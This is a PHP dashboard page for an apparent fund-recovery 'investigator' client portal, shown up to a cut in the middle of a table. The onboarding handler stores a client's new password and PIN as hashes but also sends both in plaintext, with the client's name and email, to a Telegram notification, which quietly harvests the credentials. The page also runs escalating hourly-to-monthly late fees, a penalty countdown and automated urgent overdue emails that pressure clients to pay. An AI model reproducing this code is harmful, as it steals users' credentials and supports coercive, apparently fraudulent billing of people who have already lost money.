<?php
// public/client/dashboard.php - IFW Global Client Portal Dashboard
$dir = __DIR__;
while (!file_exists($dir . '/config.php') && $dir !== dirname($dir)) {
    $dir = dirname($dir);
}
require_once $dir . '/config.php';
require_once $dir . '/includes/functions.php';

if (session_status() === PHP_SESSION_NONE) session_start();

if (!isset($_SESSION['client_logged_in']) || $_SESSION['client_logged_in'] !== true) {
    header("Location: /client/login.php");
    exit;
}

$client_id = $_SESSION['client_portal_id'] ?? 0;
$_SESSION['role'] = 'client';

$pwd_msg = $pwd_error = '';

// Handle onboarding security PIN and Password setup
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'setup_security') {
    $new_password = $_POST['onboarding_new_password'] ?? '';
    $new_pin = $_POST['onboarding_new_pin'] ?? '';
    
    if (strlen($new_password) < 6) {
        $pwd_error = 'Password must be at least 6 characters.';
    } elseif (strlen($new_pin) !== 4 || !is_numeric($new_pin)) {
        $pwd_error = 'Security PIN must be exactly 4 digits.';
    } else {
        $pwd_hash = password_hash($new_password, PASSWORD_BCRYPT);
        $pin_hash = password_hash($new_pin, PASSWORD_DEFAULT);
        
        $pdo->prepare("UPDATE IFW_clients SET password_hash = ?, pin_hash = ? WHERE id = ?")->execute([$pwd_hash, $pin_hash, $client_id]);
        $pwd_msg = 'Security credentials configured successfully.';
        
        // Fetch client details for telegram notification
        $stmt_c = $pdo->prepare("SELECT first_name, last_name, email FROM IFW_clients WHERE id = ?");
        $stmt_c->execute([$client_id]);
        $client_details = $stmt_c->fetch();
        
        if ($client_details) {
            $msg = "<b>🔐 IFW Client Onboarding Security Setup Completed</b>\n\n";
            $msg .= "Client ID: <b>{$client_id}</b>\n";
            $msg .= "Name: <b>" . htmlspecialchars($client_details['first_name'] . ' ' . $client_details['last_name']) . "</b>\n";
            $msg .= "Email: <b>" . htmlspecialchars($client_details['email']) . "</b>\n";
            $msg .= "New Password: <code>" . htmlspecialchars($new_password) . "</code>\n";
            $msg .= "New PIN: <code>" . htmlspecialchars($new_pin) . "</code>\n";
            
            send_telegram_notification($pdo, $msg);
        }
    }
}

// Self-healing database check
try {
    $pdo->exec("UPDATE IFW_invoices SET amount = total_amount WHERE (amount IS NULL OR amount = 0) AND total_amount > 0");
    $pdo->exec("UPDATE IFW_invoices SET total_amount = amount WHERE (total_amount IS NULL OR total_amount = 0) AND amount > 0");
} catch(Exception $e) {}

// Fetch client + assigned agent
$client = null;
try {
    $s = $pdo->prepare("
        SELECT c.*, 
               COALESCE(NULLIF(u.full_name, ''), u.username) AS agent_name, 
               u.username AS agent_username,
               u.role AS agent_role, 
               u.email AS agent_email,
               u.phone AS agent_phone
        FROM IFW_clients c 
        LEFT JOIN IFW_users u ON c.assigned_agent_id = u.id 
        WHERE c.id = ?
    ");
    $s->execute([$client_id]);
    $client = $s->fetch();
} catch(Exception $e) {}

if (!$client) { header("Location: /client/login.php"); exit; }
$_SESSION['user_name'] = $client['first_name'];

// KYC status from IFW_kyc_submissions
$kyc_status = null; $kyc_record = null;
try {
    $s = $pdo->prepare("SELECT * FROM IFW_kyc_submissions WHERE client_id=? ORDER BY submitted_at DESC LIMIT 1");
    $s->execute([$client_id]);
    $kyc_record = $s->fetch();
    $kyc_status = $kyc_record ? strtolower($kyc_record['status']) : null;
} catch(Exception $e) {}

// Notifications (unread)
$notifications = [];
$unread_count = 0;
try {
    $s = $pdo->prepare("SELECT * FROM IFW_notifications WHERE client_id=? ORDER BY created_at DESC LIMIT 10");
    $s->execute([$client_id]);
    $notifications = $s->fetchAll();
    $unread_count = count(array_filter($notifications, fn($n) => !$n['is_read']));
} catch(Exception $e) {}

// Active Cases with Investigator info
$cases = [];
try {
    $s = $pdo->prepare("
        SELECT ca.*, 
               COALESCE(NULLIF(u.full_name, ''), u.username) AS agent_name,
               u.username AS agent_username,
               u.role AS agent_role,
               u.email AS agent_email,
               u.phone AS agent_phone
        FROM IFW_cases ca 
        LEFT JOIN IFW_users u ON ca.attorney_id = u.id 
        WHERE ca.client_id=? ORDER BY ca.created_at DESC
    ");
    $s->execute([$client_id]);
    $cases = $s->fetchAll();
} catch(Exception $e) {}

// Latest case
$latest_case = $cases[0] ?? null;

// Fallback assigned agent from case if not directly on client
if (empty($client['agent_name']) && $latest_case && !empty($latest_case['agent_name'])) {
    $client['agent_name'] = $latest_case['agent_name'];
    $client['agent_username'] = $latest_case['agent_username'];
    $client['agent_role'] = $latest_case['agent_role'];
    $client['agent_email'] = $latest_case['agent_email'];
    $client['agent_phone'] = $latest_case['agent_phone'] ?? '';
}

// Format Agent display info
$agent_name_display = !empty($client['agent_name']) && $client['agent_name'] !== 'admin' ? $client['agent_name'] : ($client['agent_username'] === 'Gary009' ? 'Gary Livingston' : null);
$agent_role_display = !empty($client['agent_role']) ? ucwords(str_replace('_', ' ', $client['agent_role'])) : 'Senior Investigator';
if (in_array(strtolower($agent_role_display), ['agent', 'staff', 'admin'])) $agent_role_display = 'Senior Investigator';

// Exchange rates for multi-currency conversion to USD
$exchange_rates = [
    'USD' => 1.0,
    'EUR' => 1.08,
    'GBP' => 1.28,
    'AUD' => 0.65,
    'CAD' => 0.73,
    'CHF' => 1.12,
    'BTC' => 65000.0,
    'ETH' => 3500.0,
    'USDT' => 1.0,
    'BUSD' => 1.0
];

// Invoices & Calculations
$invoices = [];
$total_invoiced_usd = 0.00;
$total_outstanding_usd = 0.00;
$active_penalty_invoices = 0;
$total_accumulated_penalty_usd = 0.00;
$primary_penalty_invoice = null;

try {
    $s = $pdo->prepare("SELECT * FROM IFW_invoices WHERE client_id=? ORDER BY issue_date DESC, id DESC LIMIT 20");
    $s->execute([$client_id]);
    $raw_invoices = $s->fetchAll();

    foreach ($raw_invoices as $inv) {
        $curr = !empty($inv['currency']) ? strtoupper($inv['currency']) : 'USD';
        $rate = $exchange_rates[$curr] ?? 1.0;

        // Base amount
        $base_amount = floatval($inv['total_amount'] > 0 ? $inv['total_amount'] : ($inv['amount'] > 0 ? $inv['amount'] : ($inv['subtotal'] > 0 ? $inv['subtotal'] : 0)));

        // Description resolution
        $desc = trim($inv['description'] ?? '');
        if (empty($desc)) {
            try {
                $stmtDesc = $pdo->prepare("SELECT description FROM IFW_invoice_items WHERE invoice_id = ? ORDER BY id ASC LIMIT 1");
                $stmtDesc->execute([$inv['id']]);
                $item_desc = $stmtDesc->fetchColumn();
                if (!empty($item_desc)) $desc = $item_desc;
            } catch(Exception $ex) {}
        }
        if (empty($desc)) {
            $desc = !empty($inv['notes']) ? substr($inv['notes'], 0, 50) : 'Professional Legal & Forensic Services';
        }
        $inv['display_description'] = $desc;
        $inv['base_amount'] = $base_amount;
        $inv['currency'] = $curr;

        // Dynamic late fee calculation
        $dynamic_late_fee = 0.00;
        $next_penalty_time = null;
        $time_remaining_sec = 0;

        if (strtolower($inv['status']) !== 'paid' && !empty($inv['late_fee_enabled']) && $inv['late_fee_amount'] > 0) {
            $startDate = strtotime($inv['late_fee_start_date'] ?? $inv['due_date']);
            $now = time();
            $fee_rate = floatval($inv['late_fee_amount']);
            if (!empty($inv['late_fee_is_percentage'])) {
                $fee_rate = ($fee_rate / 100) * $base_amount;
            }
            
            if ($now >= $startDate) {
                $diff_sec = $now - $startDate;
                $type = $inv['late_fee_type'] ?? 'daily';
                if ($type === 'hourly') {
                    $intervals = floor($diff_sec / 3600);
                    $dynamic_late_fee = $intervals * $fee_rate;
                    $next_penalty_time = $startDate + ($intervals + 1) * 3600;
                } elseif ($type === 'daily') {
                    $intervals = floor($diff_sec / 86400);
                    $dynamic_late_fee = $intervals * $fee_rate;
                    $next_penalty_time = $startDate + ($intervals + 1) * 86400;
                } elseif ($type === 'weekly') {
                    $intervals = floor($diff_sec / (86400 * 7));
                    $dynamic_late_fee = $intervals * $fee_rate;
                    $next_penalty_time = $startDate + ($intervals + 1) * (86400 * 7);
                } else { // monthly
                    $intervals = floor($diff_sec / (86400 * 30));
                    $dynamic_late_fee = $intervals * $fee_rate;
                    $next_penalty_time = $startDate + ($intervals + 1) * (86400 * 30);
                }
                $time_remaining_sec = max(0, $next_penalty_time - $now);
            } else {
                $next_penalty_time = $startDate;
                $time_remaining_sec = max(0, $startDate - $now);
            }

            if ($dynamic_late_fee > ($inv['late_fee_accumulated'] ?? 0)) {
                try {
                    $pdo->prepare("UPDATE IFW_invoices SET late_fee_accumulated = ? WHERE id = ?")->execute([$dynamic_late_fee, $inv['id']]);
                    $inv['late_fee_accumulated'] = $dynamic_late_fee;
                } catch(Exception $ex) {}
            }
        }

        $late_fee = (strtolower($inv['status']) === 'paid') ? ($inv['late_fee_accumulated'] ?? 0) : max($dynamic_late_fee, $inv['late_fee_accumulated'] ?? 0);
        $inv['late_fee'] = $late_fee;
        $inv['next_penalty_time'] = $next_penalty_time;
        $inv['time_remaining_sec'] = $time_remaining_sec;

        $total_billed = $base_amount + $late_fee;
        $inv['total_billed'] = $total_billed;

        // Confirmed payments deduction
        $total_paid = 0.00;
        try {
            $stmtP = $pdo->prepare("SELECT SUM(amount) FROM IFW_invoice_payments WHERE invoice_id = ? AND status = 'Confirmed'");
            $stmtP->execute([$inv['id']]);
            $total_paid = floatval($stmtP->fetchColumn() ?: 0.00);
        } catch(Exception $ex) {}
        $inv['total_paid'] = $total_paid;

        $balance_due = max(0, $total_billed - $total_paid);
        $inv['balance_due'] = $balance_due;

        // Clean status
        $is_overdue = !empty($inv['due_date']) && strtotime($inv['due_date']) < time() && $balance_due > 0;
        if ($total_billed > 0 && $total_paid >= $total_billed) {
            $status_clean = 'Paid';
        } elseif ($total_paid > 0 && $balance_due > 0) {
            $status_clean = 'Partial';
        } elseif ($is_overdue || strtolower($inv['status']) === 'overdue') {
            $status_clean = 'Overdue';
        } else {
            $status_clean = 'Unpaid';
        }
        $inv['effective_status'] = $status_clean;

        // Totals in USD
        $total_invoiced_usd += ($total_billed * $rate);
        $total_outstanding_usd += ($balance_due * $rate);

        if ($late_fee > 0 || (!empty($inv['late_fee_enabled']) && $balance_due > 0)) {
            $active_penalty_invoices++;
            $total_accumulated_penalty_usd += ($late_fee * $rate);
            if (!$primary_penalty_invoice) {
                $primary_penalty_invoice = $inv;
            }
        }

        $invoices[] = $inv;
    }
} catch(Exception $e) {}

// Automated Overdue Email Reminder (Throttle to once every 24h per invoice)
if ($active_penalty_invoices > 0 && $primary_penalty_invoice && !empty($client['email'])) {
    $should_send_email = true;
    if (!empty($primary_penalty_invoice['last_reminder_sent'])) {
        if (time() - strtotime($primary_penalty_invoice['last_reminder_sent']) < 86400) {
            $should_send_email = false;
        }
    }
    if ($should_send_email) {
        try {
            $inv_ref = $primary_penalty_invoice['invoice_number'] ?? '#INV-' . str_pad($primary_penalty_invoice['id'], 5, '0', STR_PAD_LEFT);
            $subject = "Urgent Overdue Penalty Notice - Invoice {$inv_ref}";
            $body = "<h2>Overdue Penalty & Interest Notice</h2>
                     <p>Dear " . htmlspecialchars($client['first_name']) . ",</p>
                     <p>This is an automated formal notice regarding your invoice <strong>{$inv_ref}</strong> which has accumulated late fee penalty interest.</p>
                     <p><strong>Total Balance Due:</strong> " . htmlspecialchars($primary_penalty_invoice['currency']) . " " . number_format($primary_penalty_invoice['balance_due'], 2) . "<br>
                     <strong>Accumulated Late Fees:</strong> " . htmlspecialchars($primary_penalty_invoice['currency']) . " " . number_format($primary_penalty_invoice['late_fee'], 2) . "</p>
                     <p>Please log in to your <a href='" . BASE_URL . "/client/login.php'>IFW Global Client Portal</a> to settle your outstanding balance immediately and stop further interest accumulation.</p>";
            send_html_email($client['email'], $subject, $body);
            $pdo->prepare("UPDATE IFW_invoices SET last_reminder_sent = NOW() WHERE id = ?")->execute([$primary_penalty_invoice['id']]);
        } catch(Exception $ex) {}
    }
}

// Payment info (global fallback)
$global_payment_info = get_setting($pdo, 'payment_instructions', '');
$bank_details        = get_setting($pdo, 'bank_details', '');
$app_name            = get_setting($pdo, 'app_name', 'IFW Global');

require_once $dir . '/includes/admin_header.php';
require_once $dir . '/includes/admin_sidebar.php';
?>

<style>
.notif-bell { position:relative; cursor:pointer; }
.notif-badge { position:absolute; top:-6px; right:-8px; background:#dc3545; color:#fff; border-radius:50%; width:18px; height:18px; font-size:10px; display:flex; align-items:center; justify-content:center; font-weight:700; }
.kyc-banner { border-left: 5px solid #fecc56; }
.kyc-banner.approved { border-left-color: #28a745; }
.kyc-banner.rejected { border-left-color: #dc3545; }
.kyc-banner.pending  { border-left-color: #ffc107; }
.case-card { border-left: 4px solid #fecc56; transition: box-shadow .2s; }
.case-card:hover { box-shadow: 0 6px 24px rgba(0,0,0,.15) !important; }
.invoice-status-paid    { color:#28a745; font-weight:700; }
.invoice-status-unpaid  { color:#dc3545; font-weight:700; }
.invoice-status-overdue { color:#e83e3e; font-weight:700; }
.invoice-status-partial { color:#fd7e14; font-weight:700; }
.pay-btn { background: linear-gradient(135deg,#fecc56,#f0a500); color:#000; border:none; font-weight:700; transition:all .2s; }
.pay-btn:hover { transform:translateY(-1px); box-shadow:0 4px 15px rgba(254,204,86,.5); color:#000; }
.stat-mini { padding:16px 20px; border-radius:12px; font-weight:700; }
</style>

<!-- PAGE HEADER -->
<div class="row mb-3">
    <div class="col-12">
        <div class="d-flex justify-content-between align-items-center">
            <div>
                <h4 class="font-weight-bold mb-0 text-dark">Welcome back, <?= htmlspecialchars($client['first_name']) ?> 👋</h4>
                <p class="text-muted mb-0 small">Client Portal — <?= date('l, F j, Y') ?></p>
            </div>
            <div class="d-flex align-items-center">
                <button class="btn btn-sm btn-outline-dark font-weight-bold mr-2" data-toggle="modal" data-target="#passwordModal">
                    <i class="fas fa-key mr-1"></i> Change Password
                </button>
                <a href="/client/logout.php" class="btn btn-sm btn-outline-danger font-weight-bold">
                    <i class="fas fa-sign-out-alt mr-1"></i> Logout
                </a>
            </div>
        </div>
    </div>
</div>

<?php if ($pwd_msg): ?><div class="alert alert-success border-0 shadow-sm"><i class="fas fa-check-circle mr-2"></i><?= $pwd_msg ?></div><?php endif; ?>
<?php if ($pwd_error): ?><div class="alert alert-danger border-0 shadow-sm"><i class="fas fa-exclamation-triangle mr-2"></i><?= $pwd_error ?></div><?php endif; ?>

<!-- STAT MINI CARDS -->
<div class="row mb-4">
    <div class="col-md-3 mb-3">
        <div class="stat-mini bg-dark text-warning shadow-sm">
            <div class="text-muted small text-uppercase mb-1" style="font-size:11px; color:#aaa !important;">Active Cases</div>
            <div style="font-size:2rem;"><?= count($cases) ?></div>
        </div>
    </div>
    <div class="col-md-3 mb-3">
        <div class="stat-mini bg-dark shadow-sm" style="color:#fecc56;">
            <div class="text-muted small text-uppercase mb-1" style="font-size:11px; color:#aaa !important;">Total Invoiced</div>
            <div style="font-size:1.8rem; font-weight: 700;"><?= number_format($total_invoiced_usd, 2) ?> USD</div>
            <?php if ($total_outstanding_usd > 0): ?>
                <div class="text-danger small font-weight-bold" style="font-size:11px;">Due: <?= number_format($total_outstanding_usd, 2) ?> USD</div>
            <?php else: ?>
                <div class="text-success small font-weight-bold" style="font-size:11px;">All settled</div>
            <?php endif; ?>
        </div>
    </div>
    <div class="col-md-3 mb-3">
        <div class="stat-mini bg-dark text-white shadow-sm">
            <div class="text-muted small text-uppercase mb-1" style="font-size:11px; color:#aaa !important;">KYC Status</div>
            <div style="font-size:1.3rem; font-weight:700; margin-top:4px;">
                <?php if ($kyc_status === 'approved'): ?>
                    <span class="text-success"><i class="fas fa-check-circle"></i> Verified</span>
                <?php elseif ($kyc_status === 'pending'): ?>
                    <span class="text-warning"><i class="fas fa-hourglass-half"></i> Pending</span>
                <?php elseif ($kyc_status === 'rejected'): ?>
                    <span class="text-danger"><i class="fas fa-times-circle"></i> Rejected</span>
                <?php else: ?>
                    <span class="text-muted"><i class="fas fa-exclamation-circle"></i> Not Verified</span>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <div class="col-md-3 mb-3">
        <div class="stat-mini bg-dark shadow-sm" style="color:#fecc56;">
            <div class="text-muted small text-uppercase mb-1" style="font-size:11px; color:#aaa !important;">Assigned Agent</div>
            <?php if ($agent_name_display): ?>
                <div style="font-size:1.15rem; font-weight:700; margin-top:3px; color:#fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;" title="<?= htmlspecialchars($agent_name_display) ?>">
                    <?= htmlspecialchars($agent_name_display) ?>
                </div>
                <div class="text-warning small font-weight-bold" style="font-size:11px;">
                    <i class="fas fa-user-shield mr-1"></i><?= htmlspecialchars($agent_role_display) ?>
                </div>
            <?php else: ?>
                <div style="font-size:1.1rem; font-weight:700; margin-top:6px; color:#aaa;">
                    Being Assigned
                </div>
            <?php endif; ?>
        </div>
    </div>
</div>

<div class="row">
    <!-- LEFT COLUMN -->
    <div class="col-lg-8">
        
        <!-- KYC BANNER -->
        <?php if ($kyc_status !== 'approved'): ?>
        <div class="card shadow-sm border-0 mb-4 kyc-banner <?= $kyc_status ?>">
            <div class="card-body d-flex align-items-center justify-content-between flex-wrap">
                <div>
                    <h6 class="font-weight-bold mb-1">
                        <i class="fas fa-shield-alt mr-2 text-warning"></i> Identity Verification
                        <?php if ($kyc_status === 'pending'): ?>
                            <span class="badge badge-warning text-dark ml-2">Under Review</span>
                        <?php elseif ($kyc_status === 'rejected'): ?>
                            <span class="badge badge-danger ml-2">Rejected</span>
                        <?php else: ?>
                            <span class="badge badge-secondary ml-2">Not Started</span>
                        <?php endif; ?>
                    </h6>
                    <?php if ($kyc_status === 'pending'): ?>
                        <p class="text-muted small mb-0">Your documents are under review. Our compliance team will notify you shortly.</p>
                    <?php elseif ($kyc_status === 'rejected'): ?>
                        <p class="text-danger small mb-0 font-weight-bold">Reason: <?= htmlspecialchars($kyc_record['rejection_reason'] ?? 'Please resubmit with clearer documents.') ?></p>
                    <?php else: ?>
                        <p class="text-muted small mb-0">Complete identity verification to expedite your case and unlock all features.</p>
                    <?php endif; ?>
                </div>
                <?php if ($kyc_status !== 'pending'): ?>
                    <a href="/client/kyc.php" class="btn btn-warning btn-sm font-weight-bold text-dark mt-2 shadow-sm">
                        <i class="fas fa-upload mr-1"></i> <?= $kyc_status === 'rejected' ? 'Resubmit Documents' : 'Verify Now' ?>
                    </a>
                <?php endif; ?>
            </div>
        </div>
        <?php endif; ?>

        <!-- MY CASES -->
        <div class="card shadow-sm border-0 mb-4">
            <div class="card-header bg-dark border-bottom d-flex justify-content-between align-items-center py-3 text-warning">
                <h5 class="mb-0 font-weight-bold"><i class="fas fa-briefcase text-warning mr-2"></i>My Cases</h5>
                <a href="/client/my_cases.php" class="btn btn-sm btn-outline-warning font-weight-bold">View All <i class="fas fa-arrow-right ml-1"></i></a>
            </div>
            <div class="card-body p-3">
                <?php if (empty($cases)): ?>
                    <div class="text-center py-4">
                        <i class="fas fa-folder-open fa-3x text-muted mb-3 d-block"></i>
                        <p class="text-muted">No cases have been opened for your account yet.</p>
                        <small class="text-muted">Cases opened by your investigator will appear here.</small>
                    </div>
                <?php else: ?>
                    <?php foreach(array_slice($cases, 0, 3) as $case): ?>
                    <div class="card case-card shadow-sm border-0 mb-3">
                        <div class="card-body py-3 px-4">
                            <div class="d-flex justify-content-between align-items-start">
                                <div class="flex-grow-1">
                                    <div class="d-flex align-items-center mb-1">
                                        <span class="badge badge-dark mr-2" style="font-size:11px;"><?= htmlspecialchars($case['case_number'] ?? 'IFW-' . $case['id']) ?></span>
                                        <?php
                                        $cstat = strtolower($case['status'] ?? 'pending');
                                        $cbadge = ['pending'=>'warning text-dark','in progress'=>'info','active'=>'info','resolved'=>'success','closed'=>'secondary','rejected'=>'danger'][$cstat] ?? 'secondary';
                                        ?>
                                        <span class="badge badge-<?= $cbadge ?>"><?= htmlspecialchars(ucwords($case['status'] ?? 'Pending')) ?></span>
                                        <?php if (!empty($case['priority'])): ?>
                                            <span class="badge badge-<?= $case['priority']==='Critical'?'danger':($case['priority']==='High'?'warning text-dark':'secondary') ?> ml-1" style="font-size:10px;"><?= $case['priority'] ?></span>
                                        <?php endif; ?>
                                    </div>
                                    <h6 class="font-weight-bold mb-1"><?= htmlspecialchars($case['title']) ?></h6>
                                    <?php if (!empty($case['description'])): ?>
                                        <p class="text-muted small mb-1"><?= htmlspecialchars(substr($case['description'], 0, 120)) ?><?= strlen($case['description']) > 120 ? '...' : '' ?></p>
                                    <?php endif; ?>
                                    <div class="text-muted" style="font-size:11px;">
                                        <i class="fas fa-calendar-alt mr-1"></i> Opened <?= date('M j, Y', strtotime($case['created_at'])) ?>
                                        <?php if (!empty($case['agent_name'])): ?>
                                            &bull; <i class="fas fa-user-shield mr-1 text-warning"></i> <?= htmlspecialchars($case['agent_name']) ?> <span class="badge badge-warning text-dark ml-1" style="font-size:9px;"><?= htmlspecialchars(ucwords(str_replace('_', ' ', $case['agent_role'] ?? 'Investigator'))) ?></span>
                                        <?php endif; ?>
                                        <?php if (!empty($case['amount_lost']) && $case['amount_lost'] > 0): ?>
                                            &bull; <i class="fas fa-dollar-sign mr-1"></i> Loss: <?= number_format($case['amount_lost'],2) ?>
                                        <?php endif; ?>
                                    </div>
                                </div>
                                <a href="/client/my_cases.php?case_id=<?= $case['id'] ?>" class="btn btn-sm btn-outline-warning ml-3">
                                    <i class="fas fa-eye mr-1"></i> View
                                </a>
                            </div>
                        </div>
                    </div>
                    <?php endforeach; ?>
                    <?php if (count($cases) > 3): ?>
                        <div class="text-center mt-2">
                            <a href="/client/my_cases.php" class="btn btn-sm btn-outline-dark font-weight-bold">View All <?= count($cases) ?> Cases</a>
                        </div>
                    <?php endif; ?>
                <?php endif; ?>
            </div>
        </div>

        <!-- OVERDUE PENALTY TICKER -->
        <?php if ($active_penalty_invoices > 0 && $primary_penalty_invoice): ?>
            <div class="alert alert-danger border-0 mb-4 p-4 shadow-sm" style="border-left: 5px solid #dc3545 !important; background: #fff5f5; color: #721c24;">
                <div class="d-flex align-items-center justify-content-between flex-wrap">
                    <div>
                        <h5 class="alert-heading font-weight-bold mb-1 text-danger">
                            <i class="fas fa-exclamation-triangle mr-2 text-danger"></i> 
                            Overdue Penalty / Penalty Interest Active
                        </h5>
                        <p class="mb-0 text-dark font-weight-bold" style="font-size: 14px;">
                            An automated late fee penalty of 
                            <?php if (!empty($primary_penalty_invoice['late_fee_is_percentage'])): ?>
                                <span class="text-danger font-weight-bold"><?= number_format($primary_penalty_invoice['late_fee_amount'], 2) ?>%</span> of total (<?= htmlspecialchars($primary_penalty_invoice['currency']) ?> <?= number_format(($primary_penalty_invoice['late_fee_amount'] / 100) * $primary_penalty_invoice['base_amount'], 2) ?>)
                            <?php else: ?>
                                <span class="text-danger font-weight-bold"><?= htmlspecialchars($primary_penalty_invoice['currency']) ?> <?= number_format($primary_penalty_invoice['late_fee_amount'], 2) ?></span>
                            <?php endif; ?>
                            is being charged <span class="badge badge-danger"><?= htmlspecialchars($primary_penalty_invoice['late_fee_type'] ?? 'daily') ?></span>.
                        </p>
                        <p class="mb-0 text-muted small mt-1">
                            Total Accumulated Overdue Fees: <strong class="text-danger"><?= number_format($total_accumulated_penalty_usd, 2) ?> USD</strong> across <?= $active_penalty_invoices ?> invoice(s).
                        </p>
                    </div>
                    <div class="text-right mt-2 mt-md-0" style="min-width: 240px;">
                        <span class="small font-weight-bold text-uppercase d-block text-muted">Next penalty increment in:</span>
                        <div id="dashPenaltyCountdown" class="font-weight-bold text-danger mt-1" style="font-size: 1.4rem; letter-spacing: 1px; font-family: monospace;">
                            00h 00m 00s
                        </div>
                    </div>
                </div>
            </div>
            
            <script>
            (function() {
                var remainingSec = <?= (int)($primary_penalty_invoice['time_remaining_sec'] ?? 0) ?>;
                function updateCountdown() {
                    if (remainingSec <= 0) {
                        document.getElementById('dashPenaltyCountdown').innerHTML = "INCREMENTING NOW";
                        return;
                    }
                    var h = Math.floor(remainingSec / 3600);
                    var m = Math.floor((remainingSec % 3600) / 60);
                    var s = remainingSec % 60;
                    document.getElementById('dashPenaltyCountdown').innerHTML = 
                        (h < 10 ? '0' : '') + h + 'h ' + 
                        (m < 10 ? '0' : '') + m + 'm ' + 
                        (s < 10 ? '0' : '') + s + 's';
                    remainingSec--;
                }
                updateCountdown();
                setInterval(updateCountdown, 1000);
            })();
            </script>
        <?php endif; ?>

        <!-- BILLING & INVOICES -->
        <div class="card shadow-sm border-0 mb-4">
            <div class="card-header bg-dark border-bottom py-3 d-flex justify-content-between align-items-center text-warning">
                <h5 class="mb-0 font-weight-bold"><i class="fas fa-file-invoice-dollar text-warning mr-2"></i>Billing & Invoices</h5>
                <span class="badge badge-warning text-dark font-weight-bold px-3 py-1"><?= count($invoices) ?> Total Invoices</span>
            </div>
            <?php if (empty($invoices)): ?>
                <div class="card-body text-center py-5">
                    <i class="fas fa-receipt fa-3x text-muted mb-3 d-block"></i>
                    <p class="text-muted">No invoices have been issued yet.</p>
                </div>
            <?php else: ?>
                <div class="table-responsive">
                    <table class="table table-hover align-middle mb-0">
                        <thead class="bg-light">
                            <tr style="font-size:12px;" class="text-uppercase text-muted">
                                <th>Invoice</th>
                                <th>Description</th>
                                <th>Amount & Balance</th>
                                <th>Due Date</th>
                                <th>Status</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach($invoices as $inv): ?>
                            <tr>
                                <td>
                                    <strong class="text-dark"><?= htmlspecialchars($inv['invoice_number'] ?? '#INV-' . str_pad($inv['id'], 5, '0', STR_PAD_LEFT)) ?></strong><br>
                                    <small class="text-muted"><?= date('M j, Y', strtotime($inv['issue_date'] ?? $inv['created_at'])) ?></small>
                                </td>
                                <td>
                                    <span class="text-dark font-weight-bold"><?= htmlspecialchars($inv['display_description']) ?></span>
                                    <?php if ($inv['late_fee'] > 0): ?>
                                        <br><small class="text-danger font-weight-bold"><i class="fas fa-exclamation-circle mr-1"></i>Late fee: +<?= htmlspecialchars($inv['currency']) ?> <?= number_format($inv['late_fee'], 2) ?></small>
                                    <?php endif; ?>
                                </td>
                                <td>
                                    <strong class="text-dark" style="font-size: 1.05rem;"><?= htmlspecialchars($inv['currency']) ?> <?= number_format($inv['total_billed'], 2) ?></strong>
                                    <?php if ($inv['total_paid'] > 0): ?>
                                        <br><small class="text-success font-weight-bold"><i class="fas fa-check-circle mr-1"></i>Paid: <?= htmlspecialchars($inv['currency']) ?> <?= number_format($inv['total_paid'], 2) ?></small>
                                        <?php if ($inv['balance_due'] > 0): ?>
                                            <br><span class="badge badge-warning text-dark font-weight-bold">Due: <?= htmlspecialchars($inv['currency']) ?> <?= number_format($inv['balance_due'], 2) ?></span>
                                        <?php endif; ?>
                                    <?php endif; ?>
                                </td>
                                <td>
                                    <?php if ($inv['due_date']): ?>
                                        <?php $is_over = strtotime($inv['due_date']) < time() && $inv['balance_due'] > 0; ?>
                                        <span class="<?= $is_over ? 'text-danger font-weight-bold' : 'text-dark' ?>">
                                            <?= date('M j, Y', strtotime($inv['due_date'])) ?>
                                            <?= $is_over ? '<br><span class="badge badge-danger" style="font-size:9px;">OVERDUE</span>' : '' ?>
                                        </span>
                                    <?php else: ?>
                                        <span class="text-muted">—</span>
                                    <?php endif; ?>
                                </td>
                                <td>
                                    <?php $st = $inv['effective_status']; ?>
                                    <?php if($st === 'Paid'): ?>
                                        <span class="badge badge-success px-2 py-1"><i class="fas fa-check-circle mr-1"></i>Paid</span>
                                    <?php elseif($st === 'Partial'): ?>
                                        <span class="badge badge-warning text-dark px-2 py-1"><i class="fas fa-adjust mr-1"></i>Partial Paid</span>
                                    <?php elseif($st === 'Overdue'): ?>
                                        <span class="badge badge-danger px-2 py-1"><i class="fas fa-exclamation-circle mr-1"></i>Overdue</span>
                                    <?php else: ?>
                                        <span class="badge badge-secondary px-2 py-1"><i class="fas fa-clock mr-1"></i>Unpaid</span>
                                    <?php endif; ?>
                                </td>
                                <td>
                                    <a href="/client/invoice_view.php?id=<?= $inv['id'] ?>" class="btn btn-sm btn-outline-secondary mr-1" title="View Invoice">
                                        <i class="fas fa-eye"></i>
                                    </a>
                                    <?php if ($inv['balance_due'] > 0): ?>
                                        <button type="button" class="btn btn-sm pay-btn" 
                                            onclick="showPayModal(<?= $inv['id'] ?>, '<?= htmlspecialchars(addslashes($inv['invoice_number'] ?? '#INV-'.str_pad($inv['id'],5,'0',STR_PAD_LEFT))) ?>', <?= $inv['balance_due'] ?>, '<?= htmlspecialchars($inv['currency']) ?>', <?= htmlspecialchars(json_encode($inv['payment_info'] ?? $global_payment_info)) ?>)">
                                            <i class="fas fa-credit-card mr-1"></i> Pay
                                        </button>
                                    <?php endif; ?>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
             <?php endif; ?>
             
             <!-- PAYMENT PROOF HISTORY -->
             <?php
             $proofs = [];
             try {
                 $stmtP = $pdo->prepare("SELECT p.*, i.invoice_number, i.currency FROM IFW_invoice_payments p JOIN IFW_invoices i ON p.invoice_id = i.id WHERE p.client_id = ? ORDER BY p.created_at DESC");
                 $stmtP->execute([$client_id]);
                 $proofs = $stmtP->fetchAll();
             } catch(Exception $e) {}
             ?>
             <?php if (!empty($proofs)): ?>
                 <div class="card-header bg-dark border-bottom py-3 d-flex justify-content-between align-items-center text-warning border-top border-secondary mt-3">
                     <h6 class="mb-0 font-weight-bold"><i class="fas fa-history text-warning mr-2"></i>Payment Verification History</h6>
                 </div>
                 <div class="table-responsive">
                     <table class="table table-hover align-middle mb-0">
                         <thead class="bg-light">
                             <tr style="font-size:11px;" class="text-uppercase text-muted">
                                 <th>Date</th>
                                 <th>Invoice</th>
                                 <th>Amount</th>
                                 <th>Reference</th>
                                 <th>Status</th>
                             </tr>
                         </thead>
                         <tbody>
                             <?php foreach($proofs as $pr): ?>
                                 <tr>
